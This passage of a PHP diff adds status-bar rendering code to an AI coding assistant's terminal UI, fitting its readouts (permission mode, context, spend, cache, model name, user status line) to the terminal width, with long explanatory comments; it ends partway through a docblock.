+        $shellWidth = Width::string(self::stripZoneMarkers(explode("\n", $shell, 2)[0]));
+        // CL-3: the shell is bare, so its chrome columns are 0 and this inset
+        // excludes nothing. Kept as the derivation (intdiv of the shared const)
+        // rather than a literal 0 so a future frame pays for itself here too.
+        $inset = intdiv(self::SHELL_CHROME_COLS, 2);
+
+        // Measured as 0-based line/cell offsets into the frame, then shifted
+        // to the 1-based cells the region is published in. The bordered shell
+        // used to skip its top border row (`+ 1`) and stop before its bottom
+        // one (`- 2`); with the border gone every shell row from shellTop to
+        // shellTop + shellRows - 1 is transcript, so the window is the whole
+        // shell the tail clip left on screen.
+        $rowFrom = max(0, $shellTop - $sliceStart);
+        $rowTo = min($available - 1, $shellTop + $shellRows - 1 - $sliceStart);
+        $colFrom = $inset;
+        $colTo = $shellWidth - 1 - $inset;
+
+        if ($rowTo < $rowFrom || $colTo < $colFrom) {
+            return null;
+        }
+
+        return [$rowFrom + 1, $rowTo + 1, $colFrom + 1, $colTo + 1];
+    }
+
+    /**
+     * The bottom status bar: the existing processing indicator/help text,
+     * plus a context-usage readout ({@see contextIndicator()}) so a user can
+     * see how full the context window is without running /compact
+     * speculatively.
+     *
+     * The bar is UNCONDITIONAL, and that is a frame-height decision, not a
+     * style one (backlog E48): renderView() appends it below
+     * `max(1, $rows - 1)` content lines, so the frame is never shorter than
+     * TWO rows — a rows=1 terminal gets a 2-row frame, which the terminal
+     * absorbs by scrolling one line. The alternative the entry recorded
+     * (reserve the bar out of $available so the frame can be 1) was declined:
+     * the bar is the ONLY announcement of a blocking permission prompt or a
+     * hidden keybinding reference ({@see KEY_HELP_TOO_SMALL},
+     * {@see KEY_HELP_OVER_PROMPT}), and a frame that dropped it to save a row
+     * would silently eat keystrokes — one scrollable row over the screen is
+     * survivable, the one row that says why keys do nothing is not. The floor
+     * is pinned by tests/Renderer/FrameHeightFloorTest.
+     *
+     * It is also where the two states in which the keybinding reference hides
+     * something announce themselves — {@see KEY_HELP_TOO_SMALL} when the box
+     * does not fit and {@see KEY_HELP_OVER_PROMPT} when it covers a blocking
+     * permission prompt. Both swallow every keystroke
+     * ({@see Chat::handleKeyHelpKey()}) while leaving the rest of the frame
+     * saying nothing about it, and a terminal that silently eats input reads as
+     * a hung app rather than as an open modal.
+     *
+     * The `statusLine` settings key's output is appended last, by
+     * {@see withStatusLineCommand()} — a FIFTH variable-length piece, below
+     * all four of the ones this method fits itself (see the fitting order
+     * below). It is absent from every bar unless the user's own settings named
+     * a command, and the cache readout {@see cacheIndicator()} is absent
+     * unless a provider reported the buckets it divides, so every width
+     * measured in the comments below still holds unqualified for a session
+     * that did neither.
+     *
+     * @param float|null $now the epoch the cache-age piece counts from
+     *        ({@see cacheIndicator()}); null means "now" and is what every
+     *        live path gets by default — the seam exists because an age
+     *        readout that reads the wall clock cannot be pinned byte-for-byte
+     *        otherwise.
+     */
+    private static function renderStatusBar(Chat $chat, ?float $now = null): string
+    {
+        // The two keybinding-reference cues REPLACE the bar. They used to be
+        // held narrower than the narrowest bar they could replace (33 and 35
+        // columns against the 36-column in-flight bar), because the bar was the
+        // one line this renderer did not truncate and a wider cue would have
+        // deepened its over-run. Since audit 15b-09 every bar and both cues are
+        // fitted to `$cols` instead, so that margin no longer carries anything.
+        //
+        // Instrument: Width::of() AFTER stripZoneMarkers() — the columns the
+        // bar actually paints. The unstripped string reads 23 columns wider
+        // (the `pane:menu` sentinel pair and the zone id inside it, which
+        // Program resolves into a paint and never puts on screen), and strlen
+        // reads the multi-byte glyphs as bytes.
+        //
+        // Swept and asserted over app states and terminal sizes by
+        // KeyHelpTest::testTheCuesFitTheTerminalInEveryAppState();
+        // testTheIdleBarTracksColumnsOnlyAndFitsEverySize() pins that the
+        // idle bar tracks COLUMNS only. Deliberately no width table here: a
+        // range written in prose went stale in this comment three rounds
+        // running, because nothing read it back.
+        //
+        // Both cues are fitted to the terminal like the bar is (audit 15b-09):
+        // a shorter form first, keeping "? closes", which is the one thing a
+        // user who cannot see the reference needs to know, then the cut.
+        if ($chat->keyHelp() !== null && self::keyHelpGeometry($chat) === null) {
+            return self::fitStatusBar(
+                self::firstFitting(self::translated(self::KEY_HELP_TOO_SMALL_FORMS), $chat->cols()),
+                $chat->cols(),
+            );
+        }
+
+        // Ordered after the too-small cue rather than combined with it: that
+        // one already says the reference is swallowing every keystroke, which
+        // is the more urgent half when nothing is painted at all, and two
+        // messages on one un-wrappable line would not fit anyway.
+        if ($chat->keyHelp() !== null && $chat->pendingPermission() !== null) {
+            return self::fitStatusBar(
+                self::firstFitting(self::translated(self::KEY_HELP_OVER_PROMPT_FORMS), $chat->cols()),
+                $chat->cols(),
+            );
+        }
+
+        // The read-only marker (audit SES-3 residual): HIGHEST priority of
+        // everything on the bar, so it is claimed before any other piece is
+        // sized and the rest of the bar is fitted into what it leaves ($cols
+        // below, not $chat->cols()). It is also the bar's FIRST text, so the
+        // backstop cut in fitStatusBar(), which takes from the end, removes
+        // it last. A window that silently refuses every prompt is the state
+        // most worth a permanent cue: the notice that explains it scrolls
+        // away, this does not. Absent on a writable session, so every bar
+        // width the sweeps pin is unchanged there.
+        $marker = $chat->isReadOnlySession() ? self::readOnlyMarker($chat) : '';
+        // The permission-mode badge (roadmap 5.7-1) rides directly behind
+        // it, claimed before everything else for the same reason: the mode
+        // decides what every tool call does, and the notice that announced a
+        // switch scrolls away. Absent in `default` mode and without a gate,
+        // so every bar width the sweeps pin is unchanged there.
+        $marker .= self::modeBadge($chat, $chat->cols() - Width::of($marker));
+        $cols = $chat->cols() - Width::of($marker);
+
+        // The "Ctrl+P menu" hint is the live path's only affordance for
+        // Pane::Menu (the palette is what the disconnected App system's
+        // MenuBar pane would have been), so it is the region that carries
+        // the `pane:menu` click zone — crush_feat.md §8 E3's "click the
+        // pane's title region to jump straight to it". While a request is in
+        // flight the hint is not drawn at all, so no zone is marked either.
+        //
+        // Shortened in priority order rather than appended whole (audit
+        // 15b-09): the full idle hint is 49 cells and was the reason the bar
+        // over-ran every terminal narrower than 54 columns. The widest form
+        // that still leaves room for the separator and the context readout's
+        // narrowest form (its bare percentage) is taken, so on any terminal
+        // the full bar fitted, it is still the full bar.
+        $processing = self::fitProcessingHint(
+            $chat,
+            $cols - Width::of(' · ') - Width::of(self::contextIndicator($chat, 0)),
+        );
+        // Messages the user sent while this turn was running
+        // ({@see Chat::enqueuePrompt()}). The transcript notice each one wrote
+        // scrolls away; this does not, which is what stops a queued message from
+        // being one the user cannot see.
+        //
+        // Appended to $processing rather than added as a fourth competing segment
+        // BECAUSE of the fitting order documented above: $processing is the one
+        // mandatory piece that is reserved before the context and spend readouts
+        // are sized, so a queue count here can never crowd out a readout that
+        // was already sized against it. Emitted only when the queue is non-empty,
+        // so every bar width the cue-fitting comment above measures is unchanged
+        // in every state that has no queue — which is every state that existed
+        // before this bundle.
+        //
+        // AND ONLY WHEN IT FITS. The bar is held to the terminal
+        // ({@see fitStatusBar()}), so a segment that did not fit would be cut
+        // off the end anyway, and could take the tail of the hint with it.
+        // Measured on a two-message in-flight fixture: the full bar is 36
+        // columns with no queue and 47 with one. So the segment is dropped when
+        // the row cannot hold it, and the queue stays visible in the transcript
+        // notice {@see Chat::enqueuePrompt()} wrote either way.
+        //
+        // The reserve is the separator plus 2 columns for the context readout's
+        // own floor — `contextIndicator()`'s last resort is `"{$percent}%"`, which
+        // can never be empty — so a fitting queue segment cannot be the piece that
+        // pushes the mandatory readout off the row. Swept over widths by
+        // {@see \SugarCraft\Code\Tests\Chat\InFlightInputQueueTest::testTheQueueSegmentNeverWidensTheBarPastTheTerminal()}.
+        $queued = count($chat->queuedPrompts());
+        if ($queued > 0) {
+            $segment = ' · ' . Lang::t('tui.status.queued', ['count' => $queued]);
+            $floor = Width::of(self::stripZoneMarkers($processing)) + Width::of($segment) + 3 + 2;
+            if ($floor <= $cols) {
+                $processing .= $segment;
+            }
+        }
+        // The answer to a mouse selection's release: without it a copy is
+        // invisible (the clipboard does not announce itself). Present only
+        // while the copied highlight is up, and held to the queue segment's
+        // fit rule so it can never be the piece that widens the bar.
+        $selection = Chat::textSelection();
+        if ($selection !== null && $selection->settled) {
+            $segment = ' · ✓ ' . Lang::t('tui.status.copied', ['count' => $selection->copiedChars]);
+            $floor = Width::of(self::stripZoneMarkers($processing)) + Width::of($segment) + 3 + 2;
+            if ($floor <= $cols) {
+                $processing .= $segment;
+            }
+        }
+        // The readout is sized against the room the rest of the row leaves
+        // rather than being emitted at full length and hoping it fits: it is
+        // the widest variable-length piece of the bar, and the bar is the one
+        // line that must never wrap (see below).
+        //
+        // Four variable-length pieces compete for the row, and the order they
+        // are FITTED in is their priority order, lowest priority last:
+        //
+        //   1. the scroll readout — its WIDEST form is reserved up front even
+        //      though it is prepended afterwards. Scroll position is transient
+        //      and shown only while the newest output is off-screen, which makes
+        //      it the most urgent thing on the bar when it appears at all.
+        //   2. the context readout — always emits something, down to a bare
+        //      percentage, because a session with no context signal at all is
+        //      worse than a narrow one.
+        //   3. the spend readout — an optional piece; like the cache readout
+        //      below it, it may vanish entirely.
+        //   4. the cache readout — fitted below spend, and it may vanish too:
+        //      both figures describe the provider's cache, which a session
+        //      without a usage split simply does not have.
+        //
+        // Reserving (1) before sizing (2), (3) and (4) is what stops a later
+        // piece crowding an earlier one off the row: each one is measured
+        // against what its seniors have already claimed, never the reverse.
+        //
+        // Two more pieces bracket these four. The read-only marker ranks
+        // ABOVE all of them: it was claimed before the processing hint, and
+        // $cols is what it left. The served-model segment ranks BELOW all of
+        // them and below the `statusLine` command too: it is fitted last, at
+        // the end of this method.
+        $separator = ' · ';
+        $indicators = self::scrollIndicators($chat);
+        $scrollReserve = $indicators === [] ? 0 : Width::of($indicators[0]);
+        $room = $cols
+            - Width::of(self::stripZoneMarkers($processing))
+            - Width::of($separator)
+            - $scrollReserve;
+        $context = self::contextIndicator($chat, $room);
+        $bar = $context . $separator . $processing;
+
+        // The spend readout goes in third, against whatever the two mandatory
+        // pieces and the scroll reservation have left. Third because it was the
+        // only one of the three that may be dropped ENTIRELY, and the cache
+        // readout fitted below it now shares that property: the context
+        // percentage always prints something (see contextIndicator()) and the
+        // processing hint is the bar's reason for existing, while a session with
+        // no cap and nothing reported has no spend to say anything about and
+        // gets no segment at all. It is measured and fitted rather than appended,
+        // for the reason stated below: the bar may not wrap.
+        $spend = self::spendIndicator(
+            $chat,
+            $cols - Width::of(self::stripZoneMarkers($bar)) - $scrollReserve - Width::of($separator),
+        );
+        if ($spend !== '') {
+            $bar = $context . $separator . $spend . $separator . $processing;
+        }
+
+        // The cache readout is fitted against whatever the spend piece left,
+        // below it and above the `statusLine` command like every other
+        // optional piece (prompt_plan.md P4.S3). Like spend it may vanish
+        // entirely — here for lack of a reported cache split rather than for
+        // lack of spend — so a session on a provider that names no buckets,
+        // which is every session until a provider fills them, paints a
+        // byte-identical bar to the one every width test in
+        // `tests/Renderer/StatusBarSpendTest.php` measures today.
+        $cache = self::cacheIndicator(
+            $chat,
+            $cols - Width::of(self::stripZoneMarkers($bar)) - $scrollReserve - Width::of($separator),
+            $now,
+        );
+        if ($cache !== '') {
+            $bar = $spend !== ''
+                ? $context . $separator . $spend . $separator . $cache . $separator . $processing
+                : $context . $separator . $cache . $separator . $processing;
+        }
+
+        // The bar is the frame's LAST line, so it is the one line that must
+        // never wrap: a wrapped bar makes the frame rows+1 physical rows tall,
+        // which is precisely the absolute-cursorTo row collision render()'s
+        // tail clip exists to prevent (renderDiff() guards the same
+        // one-logical-line-per-row invariant with Width::truncate). The scroll
+        // readout is therefore fitted to whatever room the bar leaves instead
+        // of being prepended unconditionally: any transcript tall enough to
+        // scroll produces 2-3 digit offsets, and the long form alone pushes the
+        // row past the terminal on the widths people actually use.
+        //
+        // No figure for "how wide the bar already is" is written here. It is a
+        // FUNCTION of the terminal width and the app state, not a constant, and
+        // a single number standing in for it has gone stale in this comment in
+        // three consecutive rounds (see the KEY_HELP note above for the three
+        // wrong values). The widths are swept and asserted instead, in
+        // `tests/Renderer/StatusBarSpendTest.php`:
+        // testTheIdleBarTakesExactlyTheseWidthsAtEveryTerminalWidth() pins the bar
+        // itself, testTheSpendSegmentNeverWidensTheBarBeyondTheTerminalAtAnyWidth()
+        // pins that the spend segment never pushes the bar past the terminal, and
+        // testACappedSessionsBarFitsTheTerminalIdleAndInFlight() sweeps the capped
+        // and billed states.
+        //
+        // "Fitted" means picking a narrower form or dropping it. The assembled
+        // string is cut only by fitStatusBar()'s backstop, and only after its
+        // sentinels are removed: $bar carries markPane(Pane::Menu)'s sentinel
+        // PAIR, and a cut between them leaves an unclosed open marker, which
+        // Scan::parse() skips - the menu zone silently stops being clickable
+        // (same failure mode markPaneHeader() documents). The sentinels are
+        // invisible on screen, so they come off before measuring.
+        $room = $cols - Width::of(self::stripZoneMarkers($bar));
+        foreach ($indicators as $indicator) {
+            if (Width::of($indicator) <= $room) {
+                $bar = $indicator . $bar;
+                break;
+            }
+        }
+
+        // `break` + one return instead of the loop's own
+        // `return $indicator . $bar`, so the `statusLine` segment below is
+        // reached whether or not a scroll readout was prepended. Behaviour of
+        // the loop itself is unchanged: it still takes the FIRST form that fits
+        // and stops.
+        //
+        // WHAT THIS COMMENT SAID, and why it is being replaced rather than
+        // deleted: "the four `return $indicator . $bar` this loop used to
+        // have", and that the segment "is reached on every path". Both are
+        // false and both were checkable. `git show ae30fee5:src/Renderer.php |
+        // grep -c 'return $indicator . $bar'` is 1, not 4 — there was one
+        // return, inside the loop. And this method still has TWO earlier
+        // returns that bypass this line entirely, KEY_HELP_TOO_SMALL and
+        // KEY_HELP_OVER_PROMPT above; that bypass is correct (both replace the
+        // whole bar with a cue that has to fit a terminal too small for the bar
+        // itself, so appending a user's status line to them would defeat the
+        // substitution) but it is not "every path". The rewrite is what earns
+        // the `break` its place: the reason for it is the scroll-readout path,
+        // not a universal one.
+        //
+        // The served-model segment (audit 15b-35 follow-up) is fitted after
+        // the `statusLine` command, which makes it the LOWEST-priority piece
+        // on the bar: see modelIndicator().
+        $bar = self::withStatusLineCommand($bar, $cols);
+        $model = self::modelIndicator($chat, $cols - Width::of(self::stripZoneMarkers($bar)) - Width::of($separator));
+        if ($model !== '') {
+            $bar .= $separator . $model;
+        }
+
+        return self::fitStatusBar($marker . $bar, $chat->cols());
+    }
+
+    /**
+     * The status bar's permission-mode badge (roadmap 5.7-1), with its
+     * trailing separator: the widest of {@see modeBadgeForms()} that leaves
+     * the rest of the bar the floor {@see readOnlyMarker()} leaves it, else
+     * the narrowest. '' in `default` mode and for a chat without a gate —
+     * the mode a session starts in says nothing worth a column.
+     */
+    private static function modeBadge(Chat $chat, int $room): string
+    {
+        $mode = $chat->currentPermissionMode();
+        if ($mode === null || $mode === \SugarCraft\Code\Permissions\PermissionMode::Default) {
+            return '';
+        }
+
+        $restFloor = Width::of(' · ')
+            + Width::of(self::contextIndicator($chat, 0))
+            + Width::of(self::stripZoneMarkers(self::fitProcessingHint($chat, 0)));
+
+        return self::firstFitting(self::modeBadgeForms($mode), $room - $restFloor);
+    }
+
+    /**
+     * The badge's forms, widest first. `plan` names its way out, because a
+     * mode that refuses every edit is the one a user most needs to leave.
+     *
+     * @return list<string>
+     */
+    public static function modeBadgeForms(\SugarCraft\Code\Permissions\PermissionMode $mode): array
+    {
+        return $mode === \SugarCraft\Code\Permissions\PermissionMode::Plan
+            ? [Lang::t('tui.status.mode_plan_leave') . ' · ', Lang::t('tui.status.mode_plan') . ' · ', Lang::t('tui.status.mode_plan_short') . ' · ']
+            : [Lang::t('tui.status.mode', ['mode' => $mode->value]) . ' · ', $mode->value . ' · '];
+    }
+
+    /**
+     * The read-only marker that leads the bar while another TUI owns this
+     * session ({@see Chat::isReadOnlySession()}, audit SES-3 residual), with
+     * its trailing separator, at the widest of {@see READ_ONLY_MARKER_FORMS}
+     * that still leaves the rest of the bar its floor: the separator, the
+     * context readout's bare percentage and the processing hint's narrowest
+     * form. The narrowest form is taken when none does, and
+     * {@see fitStatusBar()}'s cut then takes the rest of the row from the
+     * end — the marker, being first, outlives everything else on it.
+     */
+    private static function readOnlyMarker(Chat $chat): string
+    {
+        $restFloor = Width::of(' · ')
+            + Width::of(self::contextIndicator($chat, 0))
+            + Width::of(self::stripZoneMarkers(self::fitProcessingHint($chat, 0)));
+
+        return self::firstFitting(array_map(static fn (string $form): string => $form . ' · ', self::translated(self::READ_ONLY_MARKER_FORMS)), $chat->cols() - $restFloor);
+    }
+
+    /**
+     * The model this chat's requests go to, at the widest form that fits
+     * $room columns, or '' — the bar's LOWEST-priority segment (audit 15b-35
+     * follow-up): fitted after every other piece, `statusLine` included, so
+     * it can never be what crowds a readout off the row.
+     *
+     * THE SAME RULE AS {@see \SugarCraft\Code\Tui\Renderer::modelLabel()}:
+     * the served model the backend learned (an SGLang launch on its default
+     * id adopts the server's) before the configured id, both I/O-free. Only
+     * an {@see EngineBackend} can say either; the echo and command backends
+     * name no model, and get no segment.
+     *
+     * The served id is a string a REMOTE SERVER chose, so it goes through
+     * {@see oneLine()} ({@see untrusted()} plus the fold to one row): no
+     * escape, control byte or line break reaches the bar, and no zone
+     * sentinel reaches the one row that carries a real zone.
+     *
+     * Forms, widest first: the whole id; the part after its last `/` (an
+     * organisation prefix like `Qwen/` is the least informative part); that
+     * part ellipsised, while at least {@see MODEL_SEGMENT_MIN_COLS} columns
+     * are left — a stub shorter than that names no model; then nothing.
+     */
+    private static function modelIndicator(Chat $chat, int $room): string
+    {
+        $backend = $chat->backend();
+        if (!$backend instanceof \SugarCraft\Code\Backend\EngineBackend || $room < 1) {
+            return '';
+        }
+
+        $id = trim(self::oneLine($backend->servedModel() ?? $backend->model()));
+        if ($id === '') {
+            return '';
+        }
+
+        if (Width::of($id) <= $room) {
+            return $id;
+        }
+
+        $slash = strrpos($id, '/');
+        $short = $slash === false ? $id : substr($id, $slash + 1);
+        if ($short !== '' && Width::of($short) <= $room) {
+            return $short;
+        }
+
+        if ($short === '' || $room < self::MODEL_SEGMENT_MIN_COLS) {
+            return '';
+        }
+
+        return Width::truncate($short, $room - 1) . '…';
+    }
+
+    /**
+     * The processing hint at the widest form that fits $room columns, or its
+     * narrowest form when none does ({@see fitStatusBar()} then cuts the bar).
+     *
+     * Forms are listed widest first and drop the least useful piece first.
+     * Idle: "Enter to send" goes first (it is what every input box does), then
+     * "/exit or" (Ctrl+C alone still quits), then the quit hint, and the
+     * `Ctrl+P menu` hint stays to the end because the palette it opens lists
+     * every other action and it carries the `pane:menu` click zone. In flight:
+     * the cancel key outlives "thinking…", since the transcript already shows
+     * the turn is running and Esc Esc is the only way to stop it.
+     *
+     * Every idle form marks the menu label WHOLE, so dropping a form never
+     * splits the zone's sentinel pair.
+     *
+     * An engine turn that reports its steps (roadmap 1.C-4) names the step it
+     * is on, adds the step's context figure once the request is over its step
+     * budget (roadmap 2.1), and offers the soft stop its first Escape is; once
+     * that stop is asked for, the hint says the turn is stopping and that the
+     * next Escape cancels at once. A turn that reports no steps keeps the
+     * original forms.
+     */
+    private static function fitProcessingHint(Chat $chat, int $room): string
+    {
+        $step = $chat->liveStep();
+        if ($chat->inFlight && $chat->stopRequested()) {
+            $stopping = $step !== null ? Lang::t('tui.status.stopping_after_step', ['step' => $step->step]) : Lang::t('tui.status.stopping');
+            $forms = [
+                '⠴ ' . $stopping . ' · ' . Lang::t('tui.status.esc_cancel_now'),
+                '⠴ ' . $stopping,
+                '⠴ ' . Lang::t('tui.status.stopping_ellipsis'),
+                '⠴',
+            ];
+        } elseif ($chat->inFlight && $step !== null) {
+            $tag = Lang::t('tui.status.step', ['step' => $step->step]);
+            if ($step->pressure?->isOverBudget() === true) {
+                $tag .= ' · ' . Lang::t('tui.status.step_ctx', ['percent' => $step->pressure->percentOfWindow()]);
+            }
+            $forms = [
+                '⠴ ' . $tag . ' · ' . Lang::t('tui.status.thinking') . ' · ' . Lang::t('tui.status.esc_stop_or_cancel'),
+                '⠴ ' . $tag . ' · ' . Lang::t('tui.status.esc_stop_or_cancel'),
+                '⠴ ' . $tag . ' · ' . Lang::t('tui.status.esc_esc_cancel'),
+                '⠴ ' . $tag,
+                '⠴',
+            ];
+        } elseif ($chat->inFlight) {
+            $forms = [
+                '⠴ ' . Lang::t('tui.status.thinking') . ' · ' . Lang::t('tui.status.esc_esc_cancel'),
+                '⠴ ' . Lang::t('tui.status.esc_esc_cancel'),
+                '⠴ ' . Lang::t('tui.status.thinking'),
+                '⠴',
+            ];
+        } else {
+            $menu = self::markPane(Pane::Menu, Lang::t('tui.status.menu'));
+            $forms = [
+                Lang::t('tui.status.enter_to_send') . ' · ' . $menu . ' · ' . Lang::t('tui.status.exit_or_quit'),
+                $menu . ' · ' . Lang::t('tui.status.exit_or_quit'),
+                $menu . ' · ' . Lang::t('tui.status.quit'),
+                $menu,
+                self::markPane(Pane::Menu, Lang::t('tui.status.menu_short')),
+            ];
+        }
+
+        return self::firstFitting($forms, $room);
+    }
+
+    /**
+     * The first of $forms whose painted width (zone sentinels excluded) is at
+     * most $room, or the last form when none is.
+     *
+     * @param non-empty-list<string> $forms widest first
+     */
+    private static function firstFitting(array $forms, int $room): string
+    {
+        foreach ($forms as $form) {
+            if (Width::of(self::stripZoneMarkers($form)) <= $room) {
+                return $form;
+            }
+        }
+
+        return $forms[\count($forms) - 1];
+    }
+
+    /**
+     * The status bar held to $cols columns: the backstop under the fitting
+     * that {@see renderStatusBar()} does piece by piece (audit 15b-09).
+     *
+     * Reached only when even the narrowest forms do not fit, which is a
+     * terminal of about a dozen columns or fewer. The bar is the frame's
+     * last row, and an over-wide last row is soft-wrapped by the terminal,
+     * which breaks the absolute-cursorTo repaint the tail clip protects.
+     *
+     * The cut is taken on the bar with its zone sentinels REMOVED, so the
+     * `pane:menu` zone is given up rather than cut in half: a half-cut
+     * sentinel pair leaves an unclosed open, which `Scan::parse()` skips
+     * without registering a zone, and a cut through the middle of a tag
+     * leaves a lone sentinel whose would-be id bytes the scan then measures
+     * as visible text — so dropping the pair outright is the only cut that
+     * keeps the bar's cell accounting exact. The bar carries no SGR, so {@see Width::truncate()}
+     * dropping escapes loses nothing.
+     */
+    private static function fitStatusBar(string $bar, int $cols): string
+    {
+        $visible = self::stripZoneMarkers($bar);
+        if (Width::of($visible) <= $cols) {
+            return $bar;
+        }
+
+        return Width::truncate($visible, max(0, $cols));
+    }
+
+    /**
+     * The `statusLine` command's output appended to the assembled bar, or the
+     * bar unchanged.
+     *
+     * FITTED LAST, AFTER THE SCROLL READOUT HAS BEEN PLACED, which is the whole
+     * of its priority claim. {@see renderStatusBar()} documents four
+     * variable-length pieces fitted in priority order with the lowest last;
+     * this is a FIFTH, and it is below all four. Two reasons it has to be:
+     * it is the only piece whose content this process did not compute, and
+     * dropping it costs a readout the user can also get by other means, while
+     * dropping the context percentage or the scroll offset costs information
+     * only the bar carries. Measuring against `$bar` after the prepend rather
+     * than before is what makes "below the scroll readout" true rather than
+     * merely intended — measured before, a wide status line would have taken
+     * the room the scroll offset was about to claim.
+     *
+     * {@see untrusted()}, NOT a bare {@see Sanitize::untrusted()}, and the
+     * difference is the security half. The runner has already stripped
+     * ANSI/C0/C1 and collapsed the newlines
+     * ({@see \SugarCraft\Code\Config\StatusLineCommand::oneLine()}), so the
+     * sanitiser here is idempotent — what this call ADDS is the zone-sentinel
+     * strip. `U+E000`/`U+E001` are well-formed Private-Use codepoints that
+     * `Sanitize::untrusted()` passes through untouched, so a status command
+     * emitting them would reach {@see scanRoot()}'s parser verbatim and either
+     * throw the whole frame's click zones away (duplicate ids make
+     * `Scan::parse()` throw) or register attacker-chosen boxes in the hit-test
+     * registry {@see Chat::zoneAt()} reads. The bar is the ONE row that already
+     * carries a real zone (`pane:menu`), so it is the worst row to admit a
+     * forged one on.
+     *
+     * {@see Width::truncate()} rather than {@see clipToWidth()}: it iterates
+     * grapheme CLUSTERS, so it cannot cut a base character away from its
+     * combining marks, whereas `clipToWidth()` cuts with `mb_substr()` on
+     * codepoints. The clip announces itself with an ellipsis, the same way
+     * {@see \SugarCraft\Code\Hooks\ScriptHook::clip()} does, so a status
+     * line that is being truncated reads as truncated rather than as a command
+     * that stopped talking mid-word.
+     *
+     * A bar that is ALREADY at or past $cols gets no segment at all — `$room`
+     * is then <= 0 and this returns early. That is the same guard the queued
+     * -prompt segment uses: {@see fitStatusBar()} would cut a segment that did
+     * not fit, and an ellipsised stub of a status line says nothing.
+     *
+     * WHAT THE CACHED LINE COSTS PER FRAME, since this method is the only
+     * reader of it: `Width::of($line)` is a grapheme walk over the WHOLE cached
+     * line, run once per frame — i.e. once per keystroke — and the line is
+     * bounded only by
+     * {@see \SugarCraft\Code\Config\StatusLineCommand::MAX_OUTPUT_BYTES}
+     * (16 KiB), not by `$cols`. A command emitting just under the cap therefore
+     * pays a 16 KiB grapheme walk on every repaint. NOT FIXED and recorded
+     * rather than guessed at: no walk-per-keystroke figure has been measured on
+     * this box, and pre-clipping in the runner would need a width bound the
+     * runner does not have (it has no `Chat` and no `$cols`). A run that
+     * EXCEEDS the cap costs nothing, because that path blanks the segment —
+     * see `MAX_OUTPUT_BYTES`.
+     *
+     * @param int $cols the terminal width from the last
+     *        {@see \SugarCraft\Core\Msg\WindowSizeMsg}, which is the size
+     *        truth this frame is being laid out against
+     */
+    private static function withStatusLineCommand(string $bar, int $cols): string
+    {
+        $line = self::untrusted(StatusLineCommand::line());
+        if ($line === '') {
+            return $bar;
+        }
+
+        $separator = ' · ';
+        $room = $cols - Width::of(self::stripZoneMarkers($bar)) - Width::of($separator);
+        if ($room < 1) {
+            return $bar;
+        }
+
+        if (Width::of($line) > $room) {
+            // $room >= 1, so the ellipsis always has its own column and
+            // truncate() is asked for a non-negative width.
+            $line = Width::truncate($line, $room - 1) . '…';
+        }
+
+        return $bar . $separator . $line;
+    }
+
+    /**
+     * The status bar's spend readout: what this session has cost in dollars,
+     * and the cap if one is set (crush_code.md Phase 5 item 7).
+     *
+     * Empty string — no segment at all — when the session has neither a cap nor
+     * a reported spend, which is every offline run, every
+     * `$CANDY_CODE_BACKEND_CMD`/`$CANDY_CODE_BACKEND_CMD_STREAM` shell-out run
+     * and every streamed session whose provider
+     * sends no usage block. A `$0.0000` on those would cost columns to say
+     * nothing, and worse, would say the wrong thing: see
+     * {@see \SugarCraft\Code\Chat::hasReportedSpend()}.
+     *
+     * `$?` is how an UNREPORTED spend prints when a cap IS set. That case needs
+     * saying out loud rather than being hidden, because the cap is then inert —
+     * {@see \SugarCraft\Code\Chat::spendCapRefusal()} fails open on an
+     * unreported session — and a user who typed `/budget 5` is entitled to know
+     * the guard they asked for is not measuring anything. `$0.0000 of $5.0000`
+     * would have claimed the opposite.
+     *
+     * Both figures use the same four-decimal spelling
+     * {@see \SugarCraft\Code\Util\TokenTracker::summary()} uses, so the pair
+     * is comparable digit for digit and the bar agrees with `/budget`'s own
+     * output rather than rounding differently from it.
+     *
+     * These are DOLLARS against PROVIDER-COUNTED tokens. The segment to the left
+     * is a script-weighted character estimate ({@see \SugarCraft\Code\Util\TokenEstimate})
+     * wearing a `~`. The two are never combined, and the
+     * `$` is what keeps them distinguishable at a glance — see {@see \SugarCraft\Code\Usage}.
+     *
+     * $room is the columns left after the two mandatory segments and the scroll
+     * reservation. Forms are tried widest-first exactly as
+     * {@see contextIndicator()} does, but with NO last-resort form: this one
+     * returns '' rather than push the bar into {@see fitStatusBar()}'s cut.
+     */
+    private static function spendIndicator(Chat $chat, int $room): string
+    {
+        $cap = $chat->maxCostUsd();
+        // Roadmap 1.C-4: while an engine turn runs, the steps it has already
+        // been billed for (its `usage` frames, delegated runs included) count
+        // now rather than when the turn settles — the session tracker only
+        // learns them from the settled reply, and liveUsage() is null from
+        // that same update on, so nothing is counted twice.
+        $live = $chat->liveUsage()?->turnUsage;
+        $reported = $chat->hasReportedSpend() || $live !== null;
+        $spentUsd = $chat->spentUsd() + ($live?->costUsd ?? 0.0);
+        // Uncapped, a figure only earns its columns once there is money in it:
+        // a backend that reports tokens but has no pricing would otherwise
+        // print `$0.0000` for the life of the session. With a cap set the
+        // figure stays, even at zero — it is the reading against that cap.
+        if ($cap === null && (!$reported || $spentUsd <= 0.0)) {
+            return '';
+        }
+
+        $spent = $reported ? '$' . number_format($spentUsd, 4, '.', '') : '$?';
+        $forms = $cap === null
+            ? [$spent]
+            : [
+                Lang::t('tui.status.spend_of_cap', ['spent' => $spent, 'cap' => '$' . number_format($cap, 4, '.', '')]),
+                $spent . '/$' . number_format($cap, 4, '.', ''),
+                $spent,
+            ];
+
+        foreach ($forms as $form) {
+            if (Width::of($form) <= $room) {
+                return $form;
+            }
+        }
+
+        return '';
+    }
+
+    /**
+     * The status bar's cache-health readout: the share of the last reported
+     * prompt that the provider served from its prompt cache, and the age of
+     * that report (prompt_plan.md P4.S3; prompt_expand.md §9.14 — the idea is
+     * `leeguooooo/claude-code-usage-bar`'s prompt-cache-age status line, §7.9).
+     *
+     * ## THE FORMULA, derived from the merged {@see Usage} bucket semantics
+     *
+     * Over the NEWEST history entry whose usage carries a computable,
+     * non-degenerate prompt-side split — that is, the newest one with
+     * {@see Usage::promptTokens()} non-null and positive, which by P4.S1's
+     * shipped semantics means all three prompt buckets
+     * (`inputTokens`, `cacheReadTokens`, `cacheCreationTokens`) were
+     * reported:
+     *
+     *     hitPercent = round(cacheReadTokens / promptTokens() * 100)
+     *     ageSeconds = floor(now - entry.createdAt)          (clamped at 0)
+     *
+     * with `promptTokens() = cacheRead + cacheCreation + input` (§9.14's
+     * "total = cache_read + cache_creation + input", `input_tokens` counting
+     * only what follows the last breakpoint). `Usage` clamps negatives to zero
+     * at construction, so the identity makes `hitPercent` land in [0, 100] by
